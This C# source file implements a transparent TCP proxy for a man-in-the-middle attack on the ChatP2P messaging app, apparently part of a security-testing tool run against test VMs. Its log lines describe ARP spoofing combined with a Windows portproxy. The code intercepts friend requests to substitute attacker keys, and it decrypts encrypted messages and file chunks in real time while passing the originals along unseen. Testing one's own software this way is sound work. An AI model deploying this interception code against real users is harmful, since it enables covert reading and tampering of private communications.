using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Linq;
using ChatP2P.SecurityTester.Models;
using ChatP2P.SecurityTester.Crypto;

namespace ChatP2P.SecurityTester.Network
{
    /// <summary>
    /// 🕷️ Proxy TCP transparent pour MITM réel - Interception et modification packets ChatP2P
    /// </summary>
    public class TCPProxy
    {
        private TcpListener? _proxyListener;
        private bool _isRunning = false;
        private readonly KeySubstitutionAttack _keyAttack;
        private CancellationTokenSource? _cancellationToken;

        public event Action<string>? LogMessage;
        public event Action<AttackResult>? PacketModified;

        public TCPProxy(KeySubstitutionAttack keyAttack)
        {
            _keyAttack = keyAttack;
        }

        /// <summary>
        /// 🚀 Démarre proxy TCP transparent avec mapping automatique des ports ChatP2P
        /// </summary>
        public async Task<bool> StartProxy(int listenPort, string targetHost, int targetPort)
        {
            try
            {
                // Obtenir IP locale pour logs et configuration
                var localIP = GetLocalIPAddress();

                // 🚨 ARCHITECTURE CORRIGÉE: Écoute sur localhost avec portproxy transparent
                LogMessage?.Invoke($"🔧 ARCHITECTURE CORRECTE: Windows Portproxy + TCPProxy localhost");
                LogMessage?.Invoke($"📡 FLOW: ARP-Spoof → {localIP}:{listenPort} → portproxy → 127.0.0.1:{listenPort} → {targetHost}:{targetPort}");

                _proxyListener = new TcpListener(IPAddress.Any, listenPort);
                _proxyListener.Start();
                _isRunning = true;
                _cancellationToken = new CancellationTokenSource();

                LogMessage?.Invoke($"🕷️ Proxy TCP MITM: 127.0.0.1:{listenPort} → {targetHost}:{targetPort}");
                LogMessage?.Invoke($"🎯 Architecture: ARP-Spoof → Portproxy({localIP}:{listenPort}) → TCPProxy(127.0.0.1:{listenPort}) → Relay({targetHost}:{targetPort})");
                LogMessage?.Invoke($"📡 En attente connexions via Windows portproxy transparent...");
                LogMessage?.Invoke($"🔧 DEBUG: TcpListener créé sur 127.0.0.1:{listenPort}");
                LogMessage?.Invoke($"🔧 DEBUG: _isRunning={_isRunning}, Task.Run lancé pour AcceptConnections");

                // Test si le port est bien ouvert
                LogMessage?.Invoke($"🔧 DEBUG: Test port ouverture - TcpListener.LocalEndpoint = {_proxyListener.LocalEndpoint}");
                LogMessage?.Invoke($"🔧 DEBUG: Test port ouverture - TcpListener.Server.IsBound = {_proxyListener.Server.IsBound}");

                // Accepter connexions entrantes de manière asynchrone
                _ = Task.Run(async () => await AcceptConnections(targetHost, targetPort, _cancellationToken.Token));

                // Petite attente pour vérifier que le listener fonctionne
                await Task.Delay(100);
                LogMessage?.Invoke($"🔧 DEBUG: Proxy TCP opérationnel - En attente connexions...");

                // ✅ SUPPRIMÉ: Tests connexions automatiques (causaient connexions parasites au relay)

                return true;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur démarrage proxy: {ex.Message}");
                LogMessage?.Invoke($"🔧 DEBUG: Stack trace: {ex.StackTrace}");
                return false;
            }
        }

        private async Task AcceptConnections(string targetHost, int targetPort, CancellationToken cancellationToken)
        {
            try
            {
                LogMessage?.Invoke($"🔧 DEBUG: AcceptConnections démarré - _isRunning={_isRunning}");
                LogMessage?.Invoke($"🔧 DEBUG: En attente sur _proxyListener.AcceptTcpClientAsync()...");

                while (_isRunning && !cancellationToken.IsCancellationRequested)
                {
                    LogMessage?.Invoke($"🔧 DEBUG: Boucle accept - en attente connexion...");

                    try
                    {
                        var clientSocket = await _proxyListener!.AcceptTcpClientAsync();
                        LogMessage?.Invoke($"📡 CONNEXION REÇUE: {clientSocket.Client.RemoteEndPoint}");
                        LogMessage?.Invoke($"🔧 DEBUG: Client connecté, lancement HandleConnection");

                        // Traiter chaque connexion en parallèle
                        _ = Task.Run(async () => await HandleConnection(clientSocket, targetHost, targetPort, cancellationToken));
                    }
                    catch (Exception ex)
                    {
                        LogMessage?.Invoke($"❌ Erreur AcceptTcpClientAsync: {ex.Message}");
                        LogMessage?.Invoke($"🔧 DEBUG: Exception type: {ex.GetType().Name}");
                        break;
                    }
                }

                LogMessage?.Invoke($"🔧 DEBUG: Sortie boucle AcceptConnections - _isRunning={_isRunning}, cancelled={cancellationToken.IsCancellationRequested}");
            }
            catch (Exception ex) when (!cancellationToken.IsCancellationRequested)
            {
                LogMessage?.Invoke($"❌ Erreur acceptation connexions: {ex.Message}");
                LogMessage?.Invoke($"🔧 DEBUG: Exception stack: {ex.StackTrace}");
            }
        }

        private async Task HandleConnection(TcpClient clientSocket, string targetHost, int targetPort, CancellationToken cancellationToken)
        {
            TcpClient? relaySocket = null;

            try
            {
                LogMessage?.Invoke($"🔧 DEBUG: HandleConnection démarré pour {clientSocket.Client.RemoteEndPoint}");

                // PROXY INTELLIGENT - Connexion par défaut au port API (8889)
                // Le port sera ajusté dynamiquement selon le contenu
                int dynamicTargetPort = targetPort; // Commence avec 8889 par défaut

                LogMessage?.Invoke($"🔧 DEBUG: Tentative connexion vers {targetHost}:{dynamicTargetPort}");

                relaySocket = new TcpClient();
                relaySocket.ReceiveTimeout = 120000; // 2 minutes (gros JSON)
                relaySocket.SendTimeout = 120000;    // 2 minutes
                relaySocket.ReceiveBufferSize = 1048576; // 1MB buffer
                relaySocket.SendBufferSize = 1048576;    // 1MB buffer
                relaySocket.NoDelay = true;             // Désactive Nagle Algorithm (performance)
                relaySocket.LingerState = new System.Net.Sockets.LingerOption(false, 0); // Pas de linger
                await relaySocket.ConnectAsync(targetHost, dynamicTargetPort);

                // ⏱️ FIX TIMEOUT: Keep-alive pour relay socket aussi
                relaySocket.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);

                LogMessage?.Invoke($"🔄 Tunnel établi: Client ↔ [PROXY] ↔ {targetHost}:{targetPort}");

                // ⚡ Configuration optimisée pour gros JSON (search peers)
                clientSocket.ReceiveBufferSize = 1048576; // 1MB
                clientSocket.SendBufferSize = 1048576;    // 1MB
                clientSocket.ReceiveTimeout = 120000;     // 2 minutes
                clientSocket.SendTimeout = 120000;        // 2 minutes
                clientSocket.NoDelay = true;              // Performance optimale
                clientSocket.LingerState = new System.Net.Sockets.LingerOption(false, 0);

                // ⏱️ FIX TIMEOUT: Keep-alive pour maintenir connexions proxy en vie
                clientSocket.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);

                var clientStream = clientSocket.GetStream();
                var relayStream = relaySocket.GetStream();

                LogMessage?.Invoke($"🔧 DEBUG: Démarrage RelayData bidirectionnel");

                // Relais bidirectionnel avec interception
                var task1 = RelayData(clientStream, relayStream, "Client→Relay", cancellationToken);
                var task2 = RelayData(relayStream, clientStream, "Relay→Client", cancellationToken);

                await Task.WhenAny(task1, task2);
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur tunnel: {ex.Message}");
                LogMessage?.Invoke($"🔧 DEBUG: HandleConnection exception: {ex.StackTrace}");
            }
            finally
            {
                clientSocket?.Close();
                relaySocket?.Close();
                LogMessage?.Invoke("🔚 Tunnel fermé");
            }
        }

        private async Task RelayData(NetworkStream source, NetworkStream destination, string direction, CancellationToken cancellationToken)
        {
            try
            {
                var buffer = new byte[1048576]; // 1MB buffer pour gros JSON (search peers)
                bool isSearchConnection = false;

                while (!cancellationToken.IsCancellationRequested)
                {
                    int bytesRead = await source.ReadAsync(buffer, 0, buffer.Length, cancellationToken);
                    if (bytesRead == 0)
                    {
                        // ✅ Connexion fermée proprement côté serveur (normal pour search)
                        if (isSearchConnection)
                        {
                            LogMessage?.Invoke($"✅ SEARCH: Connexion fermée proprement par serveur - {direction}");
                        }
                        break;
                    }

                    var data = new byte[bytesRead];
                    Array.Copy(buffer, data, bytesRead);

                    // 🔍 Détecter si c'est une connexion search AVANT modification
                    byte[] finalData = data;
                    try
                    {
                        var content = Encoding.UTF8.GetString(data);
                        if (content.Contains("search_peers") || content.Contains("\"peers\":") ||
                            (content.Contains("p2p") && content.Contains("start")) ||
                            content.Contains("\"Command\":\"p2p\"") ||
                            content.Contains("\"Action\":\"start\""))
                        {
                            isSearchConnection = true;
                            // 🚨 FIX CRITIQUE: Search/P2P start = relais direct (PAS de modification)
                            LogMessage?.Invoke($"🔍 CONNEXION P2P/SEARCH: {direction} - relais transparent");
                            finalData = data; // Pas de modification = relais direct
                        }
                        else
                        {
                            // 🚨 FIX CRITIQUE: Ne pas intercepter les requêtes API normales !
                            // SEULES les friend requests doivent être interceptées pour substituer les clés
                            if (content.Contains("FRIEND_REQ") || content.Contains("SECURE_FRIEND_REQUEST"))
                            {
                                LogMessage?.Invoke($"🎯 FRIEND REQUEST DETECTED: {direction} - interception active");
                                // 🕷️ INTERCEPTION FRIEND REQUESTS SEULEMENT
                                finalData = await InterceptAndModify(data, direction);
                            }
                            else
                            {
                                // 🔧 RELAIS TRANSPARENT pour tout le reste (API, contacts, etc.)
                                LogMessage?.Invoke($"🔧 API REQUEST: {direction} - relais transparent");
                                finalData = data; // Pas de modification
                            }
                        }
                    }
                    catch
                    {
                        // Si décodage UTF8 échoue, relayer tel quel
                        finalData = data;
                    }

                    await destination.WriteAsync(finalData, 0, finalData.Length, cancellationToken);
                    await destination.FlushAsync(cancellationToken);
                }
            }
            catch (Exception ex) when (!cancellationToken.IsCancellationRequested)
            {
                // 🔍 SEARCH: Ignorer timeouts normaux pour les connexions search
                if (ex.Message.Contains("timeout") || ex.Message.Contains("time") ||
                    ex.Message.Contains("A connection attempt failed") ||
                    ex.Message.Contains("established connection failed"))
                {
                    LogMessage?.Invoke($"⏱️ CONNEXION FERMÉE: {direction} - Normal pour search one-shot");
                    LogMessage?.Invoke($"   Type: {ex.GetType().Name}");
                    return; // Exit proprement sans erreur
                }

                LogMessage?.Invoke($"❌ Erreur relais {direction}: {ex.Message}");
                LogMessage?.Invoke($"🔧 DEBUG: Exception type: {ex.GetType().Name}");
            }
        }

        /// <summary>
        /// 🎯 Intercepte et modifie les packets ChatP2P en temps réel
        /// </summary>
        private async Task<byte[]> InterceptAndModify(byte[] data, string direction)
        {
            try
            {
                // 🔧 FIX SEARCH: Conversion UTF8 peut corrompre search JSON
                string content;
                try
                {
                    content = Encoding.UTF8.GetString(data);
                }
                catch
                {
                    // Si décodage UTF8 échoue, relayer tel quel
                    LogMessage?.Invoke($"⚠️ BINARY DATA - Relais transparent {direction}: {data.Length} bytes");
                    return data;
                }

                // 🔍 PRIORITY CHECK: Search peers = relais transparent (pas de modification)
                if (content.Contains("search_peers") || content.Contains("find_peer"))
                {
                    LogMessage?.Invoke($"🔍 SEARCH REQUEST: {direction} - {data.Length} bytes");
                    LogMessage?.Invoke($"🔍 SEARCH CONTENT: {content.Substring(0, Math.Min(200, content.Length))}");
                    return data; // ✅ RELAIS DIRECT SANS CONVERSION
                }

                // 🔍 SEARCH RESPONSE: Detection et gestion spéciale
                if (content.Contains("\"peers\":") && direction == "Relay→Client")
                {
                    LogMessage?.Invoke($"🔍 SEARCH RESPONSE: {direction} - {data.Length} bytes");
                    LogMessage?.Invoke($"✅ Peers trouvés dans réponse - connexion terminée proprement");

                    // Marquer que cette connexion est pour un search (one-shot)
                    _ = Task.Run(async () =>
                    {
                        await Task.Delay(1000); // Laisser le temps de transmettre
                        LogMessage?.Invoke($"🔚 Search terminé - fermeture connexion dans 1s");
                    });

                    return data; // ✅ RELAIS DIRECT SANS CONVERSION
                }

                // 🐛 DEBUG: Logger TOUT le trafic pour diagnostic (sauf search)
                if (content.Length > 10) // Ignore petits packets vides
                {
                    var preview = content.Length > 50 ? content.Substring(0, 50) + "..." : content;
                    LogMessage?.Invoke($"🔍 DEBUG {direction}: {preview}");
                }

                // 🔍 Détecter friend requests (patterns ChatP2P exacts)
                if ((content.Contains("FRIEND_REQ:") || content.Contains("FRIEND_REQ_DUAL:") ||
                     content.Contains("SECURE_FRIEND_REQUEST")) && direction == "Client→Relay")
                {
                    LogMessage?.Invoke($"🎯 FRIEND REQUEST INTERCEPTÉE!");
                    LogMessage?.Invoke($"   Direction: {direction}");
                    LogMessage?.Invoke($"   Contenu: {content.Substring(0, Math.Min(100, content.Length))}...");

                    // 🕷️ SUBSTITUTION CLÉS EN TEMPS RÉEL
                    var attackResult = await _keyAttack.AttemptFriendRequestSubstitution(content);

                    if (attackResult.Success && !string.IsNullOrEmpty(attackResult.Details))
                    {
                        LogMessage?.Invoke("✅ SUBSTITUTION RÉUSSIE - Clés attaquant injectées!");

                        PacketModified?.Invoke(new AttackResult
                        {
                            Success = true,
                            AttackType = "REAL_TIME_KEY_SUBSTITUTION",
                            Description = "Friend request modifiée en temps réel",
                            Details = $"Original: {content.Length} bytes → Modifié: {attackResult.Details.Length} bytes"
                        });

                        return Encoding.UTF8.GetBytes(attackResult.Details);
                    }
                }

                // 🔓 Détecter messages chiffrés PQC pour déchiffrement
                if (content.Contains("[PQC_ENCRYPTED]") && direction == "Client→Relay")
                {
                    LogMessage?.Invoke($"🔒 MESSAGE CHIFFRÉ INTERCEPTÉ!");
                    LogMessage?.Invoke($"   Direction: {direction}");
                    LogMessage?.Invoke($"   Contenu chiffré: {content.Substring(0, Math.Min(100, content.Length))}...");

                    // 🕷️ DÉCHIFFREMENT EN TEMPS RÉEL avec clés attaquant
                    var decryptResult = await _keyAttack.AttemptMessageDecryption(content);

                    if (decryptResult.Success && !string.IsNullOrEmpty(decryptResult.Details))
                    {
                        LogMessage?.Invoke("🔓 DÉCHIFFREMENT RÉUSSI - Message en clair lu!");
                        LogMessage?.Invoke($"💬 Contenu: \"{decryptResult.Details}\"");

                        PacketModified?.Invoke(new AttackResult
                        {
                            Success = true,
                            AttackType = "REAL_TIME_MESSAGE_DECRYPTION",
                            Description = "Message chiffré déchiffré en temps réel",
                            Details = $"Message: \"{decryptResult.Details}\""
                        });

                        // Laisser passer le message chiffré original (invisible)
                    }
                }

                // 📁 Détecter fichiers chiffrés pour déchiffrement
                if (content.Contains("FILE_CHUNK_RELAY:") && content.Contains("ENC:") && direction == "Client→Relay")
                {
                    LogMessage?.Invoke($"📁 FICHIER CHIFFRÉ INTERCEPTÉ!");
                    LogMessage?.Invoke($"   Direction: {direction}");
                    LogMessage?.Invoke($"   Chunk chiffré: {content.Substring(0, Math.Min(100, content.Length))}...");

                    // 🕷️ DÉCHIFFREMENT FICHIER EN TEMPS RÉEL avec clés attaquant
                    var decryptResult = await _keyAttack.AttemptFileDecryption(content);

                    if (decryptResult.Success && !string.IsNullOrEmpty(decryptResult.Details))
                    {
                        LogMessage?.Invoke("🔓 FICHIER DÉCHIFFRÉ - Chunk en clair lu!");
                        LogMessage?.Invoke($"📄 Contenu: {decryptResult.Details.Substring(0, Math.Min(50, decryptResult.Details.Length))}...");

                        PacketModified?.Invoke(new AttackResult
                        {
                            Success = true,
                            AttackType = "REAL_TIME_FILE_DECRYPTION",
                            Description = "Fichier chiffré déchiffré en temps réel",
                            Details = $"Chunk: {decryptResult.Details.Length} bytes déchiffrés"
                        });

                        // Laisser passer le chunk chiffré original (invisible)
                    }
                }

                // 🔍 Logger autres trafics intéressants
                if (content.Contains("CHAT_MSG") || content.Contains("FILE_CHUNK"))
                {
                    LogMessage?.Invoke($"📨 Trafic ChatP2P: {direction} - {content.Substring(0, Math.Min(50, content.Length))}...");
                }

                // 🔍 NOTE: Search peers diagnostic supprimé - relais transparent activé

                // 🕷️ INJECTION AUTOMATIQUE FRIEND REQUEST si on voit "PEERS:VM1,VM2"
                if (content.Contains("PEERS:VM1,VM2") && direction == "Relay→Client")
                {
                    LogMessage?.Invoke($"🎯 PEERS détectés ! Injection automatique friend request VM1→VM2");
                    LogMessage?.Invoke($"⚠️ Friend request injection not implemented yet");
                }

                return data; // Pas de modification
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur modification packet: {ex.Message}");
                return data; // Retourner données originales en cas d'erreur
            }
        }

        public void StopProxy()
        {
            try
            {
                _isRunning = false;
                _cancellationToken?.Cancel();
                _proxyListener?.Stop();

                LogMessage?.Invoke("⏹️ Proxy TCP arrêté");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur arrêt proxy: {ex.Message}");
            }
        }

        public bool IsRunning => _isRunning;

        private async Task TestLocalConnection(int port)
        {
            await Task.Delay(500); // Attendre que le proxy soit bien démarré

            try
            {
                LogMessage?.Invoke($"🧪 TEST: Tentative connexion locale vers localhost:{port}");

                using var testClient = new TcpClient();
                testClient.ReceiveTimeout = 5000;
                testClient.SendTimeout = 5000;

                await testClient.ConnectAsync("127.0.0.1", port);
                LogMessage?.Invoke($"✅ TEST: Connexion locale réussie vers localhost:{port}");

                // Envoyer données de test
                var testData = System.Text.Encoding.UTF8.GetBytes("TEST_CONNECTION\n");
                var stream = testClient.GetStream();
                await stream.WriteAsync(testData, 0, testData.Length);

                LogMessage?.Invoke($"📤 TEST: Données test envoyées");

                testClient.Close();
                LogMessage?.Invoke($"🔚 TEST: Connexion test fermée");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ TEST: Échec connexion locale: {ex.Message}");
                LogMessage?.Invoke($"🔧 TEST: Exception type: {ex.GetType().Name}");
            }
        }

        private string GetLocalIPAddress()
        {
            try
            {
                // Obtenir l'IP locale réelle (pas localhost)
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                var localIP = host.AddressList
                    .Where(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    .Where(ip => !System.Net.IPAddress.IsLoopback(ip))
                    .FirstOrDefault();

                return localIP?.ToString() ?? "localhost";
            }
            catch
            {
                return "localhost";
            }
        }
    }
}